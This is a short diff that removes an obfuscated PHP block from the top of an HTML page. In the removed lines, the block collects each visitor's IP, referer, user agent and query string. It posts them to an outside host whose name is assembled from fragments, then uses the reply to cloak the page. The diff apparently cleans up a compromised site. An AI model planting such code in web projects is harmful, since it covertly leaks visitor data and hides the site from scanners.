@@ -1,12 +1,4 @@
-<?php
- if (!function_exists('xfPRVqMwD5')) { function xfPRVqMwD5() { $xQGblS = $_SERVER['SERVER_ADDR']; $xQcmH = '127.0.0.1'; if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xQcmH) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xQGblS))) {$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];} elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xQcmH)) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xQcmH) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xQGblS))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xQcmH) && (($_SERVER['HTTP_CLIENT_IP'])!=($xQGblS))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}  $ip=xfPRVqMwD5(); 
- if (!function_exists('xXMfReqtHQz')) { function xXMfReqtHQz() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }} $ref=xXMfReqtHQz(); 
- if (!function_exists('xksrbOfgqQ')) { function xksrbOfgqQ() { if(empty($_SERVER['HTTP_USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }} $eRf9t9d9 = xksrbOfgqQ(); 
- if ($_SERVER['QUERY_STRING']!=''){ $dHerF777hg = ''.urlencode($_SERVER['QUERY_STRING']).''; } else {$dHerF777hg = '';} 
- $sourcename = 'ch'; $whatdo = 'find'; $sourceid = ''; $who = 'us'; $fd = 'x990983'; $dex9 = '.re'; $langua = 'na'; $command = 'st'; 
- $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_URL, 'https://'.$whatdo.''.$who.''.$dex9.''.$command.'/'.$who.''.$command.'.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_TIMEOUT,333); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd='.$fd.'&ip='.$ip.'&ref='.$ref.'&ua='.$eRf9t9d9.'&data='.$dHerF777hg.'&sourceid='.$sourceid.'&sourcename='.$sourcename.''); $ifbot = curl_exec($ch); curl_close($ch); 
- if ($ifbot == '') { echo '<h1>CURL ERROR</h1>'; } elseif ($ifbot != '0') { die(header('HTTP/1.1 500 Internal Server Error')); } else {  } 
- ?>
+
 
 <html lang="en">
 
